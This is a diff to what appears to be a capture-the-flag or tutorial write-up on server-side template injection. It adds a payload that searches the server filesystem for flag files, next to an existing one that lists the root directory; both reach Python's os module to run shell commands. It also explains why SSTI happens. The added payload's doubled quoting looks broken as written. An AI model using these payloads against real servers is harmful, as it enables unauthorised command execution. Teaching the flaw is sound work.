@@ -23,7 +23,10 @@ You can edit the payload like this to look around:
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}
 ```
-
+Or search:
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen(''find / -name "*flag*" 2>/dev/null'').read() }}
+```
 ## Why it happens
 A template combines fixed source with separate data. The engine evaluates template syntax (`{{ name }}`) on the server, before the browser ever sees the result — SSTI happens when user input becomes part of the *template source* instead of staying a *data value* passed into it.
 ```python
